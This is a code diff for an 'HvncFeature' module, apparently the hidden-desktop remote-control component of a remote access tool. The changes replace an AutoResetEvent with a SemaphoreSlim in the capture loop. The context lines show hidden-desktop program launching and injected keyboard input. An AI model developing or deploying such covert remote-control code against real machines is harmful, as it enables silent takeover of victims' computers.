@@ -263,7 +263,7 @@ internal static class HvncFeature
     private static volatile bool _running;
     private static Thread? _captureThread;
     private static Func<int, string, System.Threading.Tasks.Task>? _send;
-    private static readonly AutoResetEvent _ackEvent = new(false);
+    private static readonly SemaphoreSlim _ackWake = new(0);
     private static volatile int _pendingAcks;
     private static int _quality   = 75;
     private static int _fpsDelay  = 50;  // 1000 / fps — used to rate-limit frames during drag
@@ -362,7 +362,7 @@ internal static class HvncFeature
     public static void Stop()
     {
         _running = false;
-        _ackEvent.Set();
+        _ackWake.Release();
         while (_inputQueue.TryDequeue(out _)) { }
         _captureThread?.Join(2000);
         _captureThread = null;
@@ -427,7 +427,7 @@ internal static class HvncFeature
     public static void SignalAck()
     {
         Interlocked.Increment(ref _pendingAcks);
-        _ackEvent.Set();
+        _ackWake.Release();
     }
 
     public static void HandleInput(string data)
@@ -436,7 +436,7 @@ internal static class HvncFeature
         var inp = JsonSerializer.Deserialize(data, SeroJson.Default.HvncInputDataStub);
         if (inp == null) return;
         _inputQueue.Enqueue(inp);
-        _ackEvent.Set(); // wake capture thread immediately so input isn't delayed
+        _ackWake.Release(); // wake capture thread immediately so input isn't delayed
     }
 
     public static void ExecOnDesktop(string path) => LaunchOnDesktop(path);
@@ -481,7 +481,7 @@ internal static class HvncFeature
         _inputQueue.Enqueue(new HvncInputDataStub { T = "kd", VK = VK_V       });
         _inputQueue.Enqueue(new HvncInputDataStub { T = "ku", VK = VK_V       });
         _inputQueue.Enqueue(new HvncInputDataStub { T = "ku", VK = VK_CONTROL });
-        _ackEvent.Set();
+        _ackWake.Release();
     }
 
     // ── Capture loop ──────────────────────────────────────────────────────────
@@ -512,7 +512,7 @@ internal static class HvncFeature
 
                 if (_pendingAcks <= 0 && !inDrag)
                 {
-                    _ackEvent.WaitOne(50);
+                    _ackWake.Wait(50);
                     if (!_running) break;
                     continue; // loop back to drain input before checking acks again
                 }
